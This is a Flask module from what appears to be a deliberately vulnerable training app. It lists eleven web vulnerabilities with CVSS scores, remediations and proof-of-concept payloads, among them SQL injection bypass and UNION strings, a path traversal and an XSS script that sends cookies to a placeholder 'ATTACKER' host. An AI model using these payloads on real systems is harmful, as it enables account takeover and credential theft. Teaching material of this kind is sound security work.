# modules/report.py
from flask import Blueprint, render_template, current_app
from config import VULN_MODE

report_bp = Blueprint('report', __name__)

VULNERABILITIES_DB = [
    {
        "id": 1,
        "title": "SQL Injection (Authentication Bypass)",
        "owasp": "A03:2021 - Injection",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "endpoint": "/login (POST)",
        "parameter": "username, password",
        "poc": "' OR '1'='1' -- ",
        "description": "Unsanitized user input interpolated into raw SQL query via string formatting, allowing authentication bypass without credentials.",
        "remediation": "Utilize parameterized queries via SQLAlchemy ORM (filter_by) and verify salted password hashes with werkzeug.security."
    },
    {
        "id": 2,
        "title": "SQL Injection (UNION-Based Data Extraction)",
        "owasp": "A03:2021 - Injection",
        "severity": "HIGH",
        "cvss": "8.6",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "endpoint": "/search (GET)",
        "parameter": "query",
        "poc": "' UNION SELECT username, password_hash, 'x' FROM users -- ",
        "description": "Dynamic SQL construction inside LIKE clause allows UNION injections to extract credential hashes from unrelated tables.",
        "remediation": "Implement parameterized querying using ORM models (Product.name.contains(query))."
    },
    {
        "id": 3,
        "title": "Stored Cross-Site Scripting (XSS)",
        "owasp": "A03:2021 - Injection",
        "severity": "HIGH",
        "cvss": "8.0",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        "endpoint": "/comments (POST)",
        "parameter": "name, comment",
        "poc": "<script>fetch('http://ATTACKER:9001/steal?c='+document.cookie)</script>",
        "description": "User comments stored in database are rendered using Jinja2 '| safe' filter, bypassing contextual HTML entity encoding.",
        "remediation": "Remove the '| safe' filter and enforce contextual auto-escaping across all template render sinks."
    },
    {
        "id": 4,
        "title": "Reflected Cross-Site Scripting (XSS)",
        "owasp": "A03:2021 - Injection",
        "severity": "MEDIUM",
        "cvss": "6.1",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "endpoint": "/search_reflected (GET)",
        "parameter": "query",
        "poc": "<script>alert(document.cookie)</script>",
        "description": "Search query parameter is reflected directly into the HTML response without output encoding.",
        "remediation": "Rely on default Jinja2 auto-escaping to convert dangerous metacharacters into benign HTML entities."
    },
    {
        "id": 5,
        "title": "Cross-Site Request Forgery (CSRF)",
        "owasp": "A01:2021 - Broken Access Control",
        "severity": "HIGH",
        "cvss": "7.5",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
        "endpoint": "/change-email (POST)",
        "parameter": "new_email",
        "poc": "<body onload='document.forms[0].submit()'><form action='http://127.0.0.1:5000/change-email' method='POST'>...",
        "description": "State-changing operations execute without synchronizer tokens or strict SameSite cookie policies.",
        "remediation": "Integrate Flask-WTF CSRFProtect tokens on all POST forms and set SESSION_COOKIE_SAMESITE='Strict'."
    },
    {
        "id": 6,
        "title": "Insecure File Upload & Path Validation",
        "owasp": "A04:2021 - Insecure Design",
        "severity": "CRITICAL",
        "cvss": "9.0",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "endpoint": "/upload (POST)",
        "parameter": "profile_pic",
        "poc": "Upload of 'shell.py' disguised with 'image/png' Content-Type header to public static directory.",
        "description": "Naive blacklist checks and direct public file storage enable arbitrary file upload and potential code execution.",
        "remediation": "Validate files using python-magic MIME byte inspection, enforce strict extension whitelists, rename to UUIDs, and store outside web root."
    },
    {
        "id": 7,
        "title": "Session Hijacking & Session Fixation",
        "owasp": "A07:2021 - Identification & Auth Failures",
        "severity": "HIGH",
        "cvss": "8.1",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        "endpoint": "/set_session & /dashboard",
        "parameter": "sessionid, session cookie",
        "poc": "/set_session?sessionid=KNOWN_ID followed by victim authentication without session regeneration.",
        "description": "Cookies lack HttpOnly and SameSite flags; server fails to regenerate session tokens upon privilege level transition.",
        "remediation": "Issue cookies with HttpOnly=True, SameSite='Strict', and execute session.clear() on login."
    },
    {
        "id": 8,
        "title": "Directory Traversal & Local File Inclusion",
        "owasp": "A01:2021 - Broken Access Control",
        "severity": "HIGH",
        "cvss": "7.5",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "endpoint": "/view_doc (GET)",
        "parameter": "file",
        "poc": "/view_doc?file=../../config.py",
        "description": "Direct concatenation of user-supplied filenames without path normalization allows directory climbing to sensitive files.",
        "remediation": "Sanitize paths with werkzeug.utils.safe_join() and validate against an explicit document whitelist."
    },
    {
        "id": 9,
        "title": "Missing HTTP Security Headers & Clickjacking",
        "owasp": "A05:2021 - Security Misconfiguration",
        "severity": "MEDIUM",
        "cvss": "6.5",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "endpoint": "Global HTTP Responses",
        "parameter": "HTTP Headers",
        "poc": "<iframe src='http://127.0.0.1:5000/profile'></iframe>",
        "description": "Missing X-Frame-Options, CSP, and HSTS headers allows framing of sensitive pages and UI redressing attacks.",
        "remediation": "Configure middleware injecting Content-Security-Policy, X-Frame-Options: SAMEORIGIN, and X-Content-Type-Options: nosniff."
    },
    {
        "id": 10,
        "title": "Authentication Brute-Force & Lack of Rate Limiting",
        "owasp": "A07:2021 - Auth Failures",
        "severity": "HIGH",
        "cvss": "7.5",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "endpoint": "/login_bruteforce (POST)",
        "parameter": "password",
        "poc": "Automated dictionary attack running through wordlists without threshold throttling.",
        "description": "Lack of lockout mechanisms allows unlimited dictionary attempts against user accounts.",
        "remediation": "Implement IP rate limiting, account lockout after 5 consecutive failures, and progressive delays."
    },
    {
        "id": 11,
        "title": "Information Disclosure & Reconnaissance Exposure",
        "owasp": "A05:2021 - Security Misconfiguration",
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "endpoint": "/robots.txt & /config.py.bak",
        "parameter": "Direct URL",
        "poc": "Crawling /robots.txt leaks /admin/secret_backup and exposed backup files.",
        "description": "Overly descriptive robots.txt and accessible backup files leak internal directory layout and configuration keys.",
        "remediation": "Remove sensitive paths from robots.txt, block backup file extensions at the web server tier, and mask server headers."
    }
]

@report_bp.route('/report', methods=['GET'])
def view_report():
    completed = current_app.config.get('COMPLETED_LEVELS', set())
    
    # Calculate stats
    total_findings = len(VULNERABILITIES_DB)
    exploited_count = len(completed)
    
    crit_count = sum(1 for v in VULNERABILITIES_DB if v['severity'] == 'CRITICAL')
    high_count = sum(1 for v in VULNERABILITIES_DB if v['severity'] == 'HIGH')
    med_count = sum(1 for v in VULNERABILITIES_DB if v['severity'] == 'MEDIUM')

    return render_template('report.html',
                           vulnerabilities=VULNERABILITIES_DB,
                           completed=completed,
                           total_findings=total_findings,
                           exploited_count=exploited_count,
                           crit_count=crit_count,
                           high_count=high_count,
                           med_count=med_count)
